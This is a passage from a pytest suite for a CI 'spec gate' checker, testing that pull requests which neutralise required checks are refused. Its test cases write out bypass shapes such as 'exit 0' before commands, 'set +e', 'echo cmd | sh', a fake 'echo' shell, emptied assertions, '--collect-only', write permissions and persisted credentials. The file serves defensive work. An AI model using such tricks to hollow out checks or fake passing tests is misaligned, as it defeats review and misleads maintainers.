    wrapped = "".join(f"          command {c}\n" for c in cmds[:2]) + "".join(f"          env FOO=1 {c}\n" for c in cmds[2:])
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{BODY}", wrapped)}, **cap).returncode == 0
    plain = "".join(f"          {c}\n" for c in cmds)
    r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions:\n      contents: write # required\n").replace("{BODY}", plain)}, **cap)
    assert r.returncode == 1 and "grants a write permission" in r.stdout, r.stdout
    gate_wf = GATE_WF.replace("{A}", VERDICT_CMD).replace("{B}", EXPORT_CMD).replace("{C}", SUITE_CMD)
    for ref, r in each_pr(repo, lambda ref: pr_case("chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", ref)}, **cap), ("${{ github.event.pull_request.merge_commit_sha }}", "refs/pull/${{ github.event.number }}/merge", "main")):
        assert r.returncode == 1 and "instead of the event's base sha" in r.stdout, (ref, r.stdout)
    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{github.event.pull_request.base.sha}}")}, **cap).returncode == 0
    suite = "tests/scripts/test_spec_gate.py"
    on_base(repo, {suite: "def test_a():\n    assert f(1)\n    assert f(2)\n\n\ndef test_b():\n    assert f(3)\n"})
    r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert f(3)\n"}, **cap)
    assert r.returncode == 1 and "weakens 1 test(s) the base has (test_a: 2 assertion(s), now 0)" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    assert f(1)\n    assert f(2) and 3\n\n\ndef test_b():\n    assert f(3)\n    assert f(4)\n"}, **cap).returncode == 0
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
    for hook, r in each_pr(repo, lambda hook: pr_case("chore/gate-hook", {".githooks/pre-commit": hook}, **cap), ("#!/bin/sh\necho scripts/gate/spec_gate.py --commit\n", "#!/bin/sh\ncommand echo 'python3 scripts/gate/spec_gate.py --commit'\n",
                 "#!/bin/sh\ntrue || python3 scripts/gate/spec_gate.py --commit\n")):
        assert r.returncode == 1 and ("no longer runs `scripts/gate/spec_gate.py --commit`" in r.stdout or "is not one the hook may carry" in r.stdout), (hook, r.stdout)
    real_hook = "#!/usr/bin/env bash\nset -e\npython3 \"$(git rev-parse --show-toplevel)/scripts/gate/spec_gate.py\" --commit\n"
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": real_hook}, **cap).returncode == 0


def test_records_and_plans_land_in_the_shape_the_gate_reads(repo):
    """solyra#72 r4120167327, r4120167313 (spec_gate.py:1071, :659).

    A docs/ PR could erase a capability's traceability heading and rows while a prose
    mention kept its ID "defined", and a landing plan could name `docs/foo` or another
    FEAT's branch. Both are refused.
    """
    trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- #12 first cut\n\n## FEAT-DATA-001\n\n- #13 loader\n"
    on_base(repo, {TRACEABILITY: trace})
    erased = "# Traceability\n\nFEAT-MODEL-001 used to live here.\n\n## FEAT-DATA-001\n\n- #13 loader\n"
    r = pr(repo, "docs/trace", {TRACEABILITY: erased})
    assert r.returncode == 1 and "no longer defines 1 ID(s) the base has (FEAT-MODEL-001)" in r.stdout, r.stdout
    assert pr(repo, "docs/trace", {TRACEABILITY: trace + "\nA closing note.\n"}).returncode == 0
    new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data-b.md", "docs/superpowers/specs/2026-09-28-data-b.md"
    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="docs/foo")})
    assert r.returncode == 1 and "branch 'docs/foo' is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="feature/feat-model-001-x")})
    assert r.returncode == 1 and "serves FEAT-MODEL-001, not the plan's FEAT-DATA-001" in r.stdout, r.stdout
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-x")}).returncode == 0


def test_the_invoked_command_is_the_contract_and_policy_files_keep_their_schema(repo):
    """solyra#72 r4120337725 (P1), r4120337740 (P1), r4120337747, r4120337733 (P1)
    (spec_gate.py:749, :299, :979, :254).

    `python3 -c 'pass' python3 "$gate" ...` carried the contract text as an argument; a
    `permissions: {` mapping spanning lines hid a write grant; canvases.yml without its
    top-level key or with an unknown mode passed; and the head suite alone certified the
    proposed gate. The contract is the statement's prefix, the mapping is read whole, the
    registry keeps its schema, and CI runs the base's suite against the proposed gate.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "{JOB}    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"',
            "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    plain = "".join(f"          {c}\n" for c in cmds)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{BODY}", plain)}, **cap).returncode == 0
    for shape, r in each_pr(repo, lambda shape: pr_case("chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{BODY}", "".join(shape.replace("{c}", c) for c in cmds))}, **cap), ("          python3 -c 'pass' {c}\n", "          true {c}\n", "          x={c}\n", "          echo {c} | sh\n")):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    # a command substitution runs its command: `out=$(cmd)` counts, and the outer statement
    # keeps its shape around the substitution
    subst = "".join(f"          out=$({c} 2>&1); rc=$?\n" for c in cmds)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{BODY}", subst)}, **cap).returncode == 0
    # solyra#72 r4120337733 (P1): the BASE's suite judges the proposed gate from spec-gate.yml,
    # after the verdict; the PR's own suite (registry-check.yml) cannot certify the gate alone
    workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    gate_steps = workflow["jobs"]["gate"]["steps"]
    verdict = next(i for i, st in enumerate(gate_steps) if 'spec_gate.py --pr "$BASE_SHA" "$HEAD_SHA"' in st.get("run", ""))
    export = next(i for i, st in enumerate(gate_steps) if 'git show "$HEAD_SHA:scripts/gate/spec_gate.py"' in st.get("run", ""))
    assert verdict < export and any("upload-artifact" in st.get("uses", "") for st in gate_steps[export:])
    # stocks#1205 r4120528961 (P1), solyra#72 r4120515772 (P1): the suite runs PR-controlled Python in
    # its own job, after the verdict via `needs`, from a checkout that keeps no credentials
    suite_job = workflow["jobs"]["base-suite"]
    assert suite_job["needs"] == "gate"
    checkout = next(st for st in suite_job["steps"] if st.get("uses", "").startswith("actions/checkout"))
    assert checkout["with"]["persist-credentials"] is False and "head" not in checkout["with"]["ref"]
    assert any("download-artifact" in st.get("uses", "") for st in suite_job["steps"])
    run = next(st for st in suite_job["steps"] if "python3 -m pytest tests/scripts/test_spec_gate.py" in st.get("run", ""))
    assert "if" not in run and "continue-on-error" not in run
    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow()}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(a=EXPORT_CMD, b=VERDICT_CMD)}, **cap)
    assert r.returncode == 1 and "does not follow" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(b="echo skip")}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    # the suite job without `needs` runs concurrently with the verdict; the suite in the verdict's
    # job, or from a checkout that keeps credentials, hands PR code the token
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow().replace("    needs: gate\n", "")}, **cap)
    assert r.returncode == 1 and "does not follow" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow(b=EXPORT_CMD + "\n      - run: " + SUITE_CMD, c="echo done")}, **cap)
    assert r.returncode == 1 and "holds no checkout credentials" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_workflow().replace("          persist-credentials: false\n", "")}, **cap)
    assert r.returncode == 1 and "holds no checkout credentials" in r.stdout, r.stdout
    # stocks#1205 r4120528978 (P1): a job running the gate's commands has a checkout
    no_checkout = gate_workflow().replace("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n      - run: git fetch", "      - run: git fetch")
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": no_checkout}, **cap)
    assert r.returncode == 1 and "without an actions/checkout step" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions: {\n      contents: write\n    }\n").replace("{BODY}", plain)}, **cap)
    assert r.returncode == 1 and "grants a write permission" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions: {\n      contents: read\n    }\n").replace("{BODY}", plain)}, **cap).returncode == 0
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\npython3 -c 'pass' python3 scripts/gate/spec_gate.py --commit\n"}, **cap)
    assert r.returncode == 1 and ("no longer runs `scripts/gate/spec_gate.py --commit`" in r.stdout or "is not one the hook may carry" in r.stdout), r.stdout
    url = "https://claude.ai/artifact/DDDD"
    good = f"canvases:\n  - name: Data\n    url: {url}\n    repo: t/t\n    source_json: x.json\n    boards: []\n"
    on_base(repo, {"docs/product/canvases.yml": good})
    for bad, msg in ((good.replace("canvases:\n", ""), "one top-level `canvases:` list"),
                     (good + "    mode: maybe\n", "mode 'maybe' is not one of refresh | report-only"),
                     (good.replace(f"    url: {url}\n", ""), "every canvas names its url"),
                     (good + "boards: []\n", "one top-level `canvases:` list")):
        r = pr(repo, "docs/canvases", {"docs/product/canvases.yml": bad})
        assert r.returncode == 1 and msg in r.stdout, (bad, r.stdout)
    assert pr(repo, "docs/canvases", {"docs/product/canvases.yml": good + "    mode: report-only\n    source_docs:\n      - a.md\n"}).returncode == 0


def test_unreachable_commands_duplicate_fields_and_pruned_lineage_are_refused(repo):
    """stocks#1205 r4120381459 (P1), r4120381488, r4120381513 (spec_gate.py:183, :1274, :1159).

    An `exit 0` ahead of the contract commands left them counted although the shell never
    reached them; a second `Status` or `Last reviewed` row in a FEAT record let the last
    one win; a docs/ PR could drop PR numbers from a capability's lineage. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    plain = "".join(f"          {c}\n" for c in cmds)
    for prefix, r in each_pr(repo, lambda prefix: pr_case("chore/gate-workflow", {wf: head.replace("{BODY}", prefix + plain)}, **cap), ("          exit 0\n", "          return 0\n", "          true; exit 0\n")):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (prefix, r.stdout)
    # an exit inside a conditional body, and an echo mentioning `(exit $rc)`, do not end the script
    guarded = ("          if [ -z \"$gate\" ]; then exit 1; fi\n" + plain +
               "          echo \"proposed gate reached a verdict (exit $rc); the base gate's verdict is the one that counts\"\n          exit \"$rc\"\n")
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", guarded)}, **cap).returncode == 0
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    trace = "# Traceability\n\n## FEAT-MODEL-001\n\n**PR lineage:** #12 first cut\n"
    record = CATALOG_TEXT.replace("### FEAT-MODEL-001\n\n- Status: Production\n", RECORD.lstrip("\n"))
    on_base(repo, {CATALOG: record, TRACEABILITY: trace, PLAN: plan(pr=42)})
    stamped, grown = record.replace("2026-08-30", TODAY), trace + "\n- #42 second cut\n"
    r = pr(repo, BRANCH, {**CODE, CATALOG: stamped, TRACEABILITY: grown}, **meta)
    assert r.returncode == 0, r.stdout
    twice = stamped.replace("| Last reviewed | " + TODAY + " |\n", "| Last reviewed | " + TODAY + " |\n| Status | Retired |\n")
    r = pr(repo, BRANCH, {**CODE, CATALOG: twice, TRACEABILITY: grown}, **meta)
    assert r.returncode == 1 and "record carries Status more than once" in r.stdout, r.stdout
    r = pr(repo, "docs/trace", {TRACEABILITY: trace.replace("**PR lineage:** #12 first cut\n", "- none yet\n")})
    assert r.returncode == 1 and "lineage no longer names PR #12; lineage is a record and only grows" in r.stdout, r.stdout
    assert pr(repo, "docs/trace", {TRACEABILITY: trace + "- #77 third cut\n"}).returncode == 0


def test_backgrounded_commands_prs_on_landing_plans_and_pruned_rows_are_refused(repo):
    """stocks#1205 r4120528946 (P1), r4120528971; solyra#72 r4120515785, r4120515790
    (spec_gate.py:226, :1200, :541, :1221).

    `cmd &` counted as the contract command although the shell drops its status; two canvas
    entries could share a url; a plan landing from a docs/ branch could carry a pr number
    its implementation PR can never change; a docs/ PR could erase numbers from a catalog
    row's PRs cell. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    r = pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", "".join(f"          {c} &\n" for c in cmds) + "          wait\n")}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", "".join(f"          {c} 2>&1\n" for c in cmds))}, **cap).returncode == 0
    url = "https://claude.ai/artifact/EEEE"
    entry = f"  - name: {{N}}\n    url: {url}\n    repo: t/t\n    source_json: x.json\n    boards: []\n"
    on_base(repo, {"docs/product/canvases.yml": "canvases:\n" + entry.replace("{N}", "One")})
    r = pr(repo, "docs/canvases", {"docs/product/canvases.yml": "canvases:\n" + entry.replace("{N}", "One") + entry.replace("{N}", "Two")})
    assert r.returncode == 1 and f"{url} is listed twice" in r.stdout, r.stdout
    new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data-c.md", "docs/superpowers/specs/2026-09-28-data-c.md"
    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-c", pr=99)})
    assert r.returncode == 1 and "pr is 99 on a plan landing before its implementation; leave pr: null" in r.stdout, r.stdout
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-c")}).returncode == 0
    with_prs = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |",
                                    "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | #7 #9 |")
    on_base(repo, {CATALOG: with_prs})
    r = pr(repo, "docs/catalog", {CATALOG: with_prs.replace("| #7 #9 |", "| #9 |")})
    assert r.returncode == 1 and "the FEAT-DATA-001 row no longer names PR #7 in its PRs; lineage is a record and only grows" in r.stdout, r.stdout
    assert pr(repo, "docs/catalog", {CATALOG: with_prs.replace("| #7 #9 |", "| #7 #9 #11 |")}).returncode == 0


def test_shell_semantics_the_contract_must_read(repo):
    """stocks#1205 r4120660269 (P1), r4120660276 (P1); solyra#72 r4120633462 (P1), r4120633474 (P1)
    (spec_gate.py:175, :229, :240, :780).

    A folded `run: >` block is one command to the shell; a `checks() { ... }` body runs
    only when invoked; `set +e; cmd; true` hides cmd's failure; `pytest --collect-only`
    runs nothing. Each shape passed the contract and is refused; a step with its own
    non-bash `shell:` is not judged at all.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n{STEP}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    lines = "".join(f"          {c}\n" for c in cmds)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{STEP}", "      - run: |\n" + lines)}, **cap).returncode == 0
    for step, r in each_pr(repo, lambda step: pr_case("chore/gate-workflow", {wf: head.replace("{STEP}", step)}, **cap), ("      - run: >\n          echo harmless\n" + lines,
                 "      - run: |\n          checks() {\n" + lines + "          }\n          true\n",
                 "      - run: |\n          set +e\n" + lines + "          true\n",
                 "      - run: |\n          set +eu\n" + lines,
                 "      - shell: bash {0}\n        run: |\n" + lines,
                 "      - run: |\n" + lines.replace("python3 -m pytest tests/scripts/test_spec_gate.py\n",
                                                     "python3 -m pytest tests/scripts/test_spec_gate.py --collect-only\n"))):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (step, r.stdout)
    invoked = "      - run: |\n          checks() {\n" + lines + "          }\n          checks\n"
    # a defined function that is invoked still hides whether it ran: the body is conditional
    r = pr(repo, "chore/gate-workflow", {wf: head.replace("{STEP}", invoked)}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    restored = "      - run: |\n          set +e\n          true\n          set -e\n" + lines
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{STEP}", restored)}, **cap).returncode == 0
    guarded = ("      - run: |\n          test -d x || { echo no; exit 1; }\n" + lines
               + "          python3 -m pytest tests/scripts/test_spec_gate.py -q -p no:cacheprovider --noconftest\n")
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{STEP}", guarded)}, **cap).returncode == 0


def test_activity_types_landing_order_and_registries_are_policy(repo):
    """solyra#72 r4120633503 (P1), r4120633495, r4120633514, r4120633485 (P1) (spec_gate.py:790,
    :737, :534, :1220).

    Dropping `edited` and `ready_for_review` kept the event name; a plan could land with its
    approved spec in the same change; a ready plan could be frontmatter alone; a new partial
    requirements registry would have refused every spec citing an omitted ID. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": typed}, **cap).returncode == 0
    for types, r in each_pr(repo, lambda types: pr_case("chore/gate-workflow", {".github/workflows/spec-gate.yml": typed.replace("[opened, synchronize, reopened, edited, ready_for_review]", types)}, **cap), ("[opened, synchronize, reopened]", "[opened, synchronize, reopened, edited]", "[opened, synchronize, reopened, ready_for_review]")):
        assert r.returncode == 1 and "no longer fires on" in r.stdout, (types, r.stdout)
    # no `types:` at all means GitHub's defaults, which lack the two the gate depends on
    untyped = typed.replace("    types: [opened, synchronize, reopened, edited, ready_for_review]\n", "")
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": untyped}, **cap)
    assert r.returncode == 1 and "no longer fires on edited, ready_for_review" in r.stdout, r.stdout
    new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data-d.md", "docs/superpowers/specs/2026-09-28-data-d.md"
    r = pr(repo, "docs/plan-data", {data_spec: spec(feat_id="FEAT-DATA-001"), new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-d")})
    assert r.returncode == 1 and f"its spec {data_spec} is not on the base; the approved spec lands first" in r.stdout, r.stdout
    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
    hollow = plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-d").replace(TASKS, "")
    r = pr(repo, "docs/plan-data", {new_plan: hollow})
    assert r.returncode == 1 and "no `## Task N:` section" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-data", {new_plan: hollow + "\n## Task 1: something\n- [ ] do it\n"})
    assert r.returncode == 1 and "cites no spec section" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-data", {new_plan: hollow + "\n## Task 1: something\nSpec: § Design.\nJust do it.\n"})
    assert r.returncode == 1 and "has no checklist item" in r.stdout, r.stdout
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-d")}).returncode == 0
    on_base(repo, {REQUIREMENTS: None})
    r = pr(repo, "docs/reqs", {REQUIREMENTS: "# Requirements\n\nprose only\n"})
    assert r.returncode == 1 and "a new requirements registry defines no" in r.stdout, r.stdout
    r = pr(repo, "docs/reqs", {REQUIREMENTS: "# Requirements\n\n**REQ-DATA-001:** A missing value is never a zero.\n"})
    assert r.returncode == 1 and "omits 1 requirement(s) the specs cite (REQ-MODEL-001)" in r.stdout, r.stdout
    assert pr(repo, "docs/reqs", {REQUIREMENTS: REQUIREMENTS_TEXT}).returncode == 0


def test_gate_inputs_shells_hooks_and_canvases_are_judged_where_they_act(repo):
    """solyra#72 r4120775915 (P1), r4120775895 (P1), r4120775932; stocks#1205 r4120828215 (P1),
    r4120828221, r4120828232 (spec_gate.py:239, :246, :839, :193, :892, :1279).

    `PR_NUMBER= python3 ...` ran the verdict on an empty PR number; a `defaults: run: shell:`
    turned every step into an echo; `#!/bin/true` skipped the hook's body; a PR introducing
    the exporter escaped its check; two urls under one canvas passed a document-wide count;
    `cmd | true` and a hook without `set -e` lost the command's status. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    for shape, r in each_pr(repo, lambda shape: pr_case("chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap), ("PR_NUMBER= " + VERDICT_CMD, "env PR_DRAFT=true " + VERDICT_CMD, VERDICT_CMD + " | true")):
        assert r.returncode == 1 and ("assigns or unsets" in r.stdout or "no longer executes" in r.stdout), (shape, r.stdout)
    for head_run, r in each_pr(repo, lambda head_run: pr_case("chore/gate-workflow", {wf: typed.replace("        run: " + VERDICT_CMD + "\n", head_run)}, **cap), ("        run: |\n          export PR_TITLE=\n          " + VERDICT_CMD + "\n",
                     "        run: |\n          echo \"PR_BODY=\" >> \"$GITHUB_ENV\"\n          " + VERDICT_CMD + "\n",
                     "        run: |\n          unset HEAD_SHA\n          " + VERDICT_CMD + "\n")):
        assert r.returncode == 1 and "assigns or unsets" in r.stdout, (head_run, r.stdout)
    # the step's own env binds every input to the event; a rebound or dropped name is refused
    for rebound, r in each_pr(repo, lambda rebound: pr_case("chore/gate-workflow", {wf: typed.replace(*rebound)}, **cap), (("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", "          PR_NUMBER: ''\n"),
                    ("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", ""),
                    ("          PR_DRAFT: ${{ github.event.pull_request.draft }}\n", "          PR_DRAFT: 'false'\n"))):
        assert r.returncode == 1 and "no longer binds" in r.stdout, (rebound, r.stdout)
    spaced = typed.replace("PR_NUMBER: ${{ github.event.pull_request.number }}", "PR_NUMBER: ${{github.event.pull_request.number}}")
    assert pr(repo, "chore/gate-workflow", {wf: spaced}, **cap).returncode == 0
    # a custom shell on the workflow, the job or the step is not judged; `shell: bash` is
    for shell, r in each_pr(repo, lambda shell: pr_case("chore/gate-workflow", {wf: shell}, **cap), (typed.replace("permissions:\n", "defaults:\n  run:\n    shell: echo {0}\npermissions:\n", 1),
                  typed.replace("  gate:\n", "  gate:\n    defaults:\n      run:\n        shell: echo {0}\n", 1),
                  typed.replace("      - env:\n", "      - shell: python {0}\n        env:\n", 1))):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shell, r.stdout)
    explicit = typed.replace("permissions:\n", "defaults:\n  run:\n    shell: bash\npermissions:\n", 1)
    assert pr(repo, "chore/gate-workflow", {wf: explicit}, **cap).returncode == 0
    # the exporter's check is required as soon as the exporter exists, on the base or the head
    rc = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit')
    without = head.replace("{BODY}", "".join(f"          {c}\n" for c in cmds))
    assert pr(repo, "chore/gate-workflow", {rc: without}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {rc: without, "scripts/gate/export_model_registry.py": "print('x')\n"}, **cap)
    assert r.returncode == 1 and "export_model_registry.py --check" in r.stdout, r.stdout
    exporting = without.replace("          git ls-tree", '          python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"\n          git ls-tree')
    assert pr(repo, "chore/gate-workflow", {rc: exporting, "scripts/gate/export_model_registry.py": "print('x')\n"}, **cap).returncode == 0
    # the hook: an interpreter that runs the body, `set -e` before the call, no input assignments
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
    for hook, why in (("#!/bin/true\nset -e\npython3 scripts/gate/spec_gate.py --commit\n", "interpreter line"),
                      ("#!/usr/bin/env python3\nset -e\npython3 scripts/gate/spec_gate.py --commit\n", "interpreter line"),
                      ("set -e\npython3 scripts/gate/spec_gate.py --commit\n", "interpreter line"),
                      ("#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\ntrue\n", "after `set -e`"),
                      ("#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit | true\n", "after `set -e`"),
                      ("#!/bin/sh\nset -e\nSPEC_GATE_BRANCH=docs/x python3 scripts/gate/spec_gate.py --commit\n", "assigns or unsets SPEC_GATE_BRANCH")):
        r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": hook}, **cap)
        assert r.returncode == 1 and (why in r.stdout or "is not one the hook may carry" in r.stdout), (hook, r.stdout)
    for hook, r in each_pr(repo, lambda hook: pr_case("chore/gate-hook", {".githooks/pre-commit": hook}, **cap), ("#!/usr/bin/env bash\nset -e\npython3 scripts/gate/spec_gate.py --commit\n",
                 "#!/bin/bash\nset -euo pipefail\npython3 \"$(git rev-parse --show-toplevel)/scripts/gate/spec_gate.py\" --commit\n")):
        assert r.returncode == 0, hook
    # canvases: exactly one url per entry, at the entry's own level
    canvases = "docs/product/canvases.yml"
    url_a, url_b = "https://claude.ai/artifact/AAAA", "https://claude.ai/artifact/BBBB"
    on_base(repo, {canvases: f"canvases:\n  - name: A\n    url: {url_a}\n"})
    for text, r in each_pr(repo, lambda text: pr_case("docs/canvases", {canvases: text}), (f"canvases:\n  - name: A\n    url: {url_a}\n    url: {url_b}\n  - name: B\n    repo: t/t\n",
                 f"canvases:\n  - name: A\n    url: {url_a}\n  - name: B\n    boards:\n      - url: {url_b}\n",
                 f"canvases:\n  - name: A\n    url: {url_a}\n    mode: manual\n")):
        assert r.returncode == 1 and ("names 2 url field(s)" in r.stdout or "names 0 url field(s)" in r.stdout or "not one of" in r.stdout), (text, r.stdout)
    good = (f"canvases:\n  - name: A\n    url: {url_a}\n    repo: t/t\n    source_json: x.json\n    boards:\n      - file: x.html\n        key: id\n"
            f"  - name: B\n    url: {url_b}\n    repo: t/t\n    mode: report-only\n    source_docs:\n      - a.md\n")
    assert pr(repo, "docs/canvases", {canvases: good}).returncode == 0


def test_negations_conditions_handoffs_and_the_hook_mode_are_the_contract(repo):
    """stocks#1205 r4120913720 (P1), r4120913731 (P1); solyra#72 r4120913592 (P1), r4120913602,
    r4120913613 (spec_gate.py:252, :116, :101; registry-check.yml:106).

    `! cmd; true` and `if cmd; then :; fi` ran the command with its status ignored; a workflow
    without the artifact handoff let the base's suite test the base's gate; the head fetch and,
    where the exporter exists, the base's exporter suite were not required; a listed `git
    ls-tree` proved nothing about the hook's mode. Each is refused; the mode is read from the tree.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
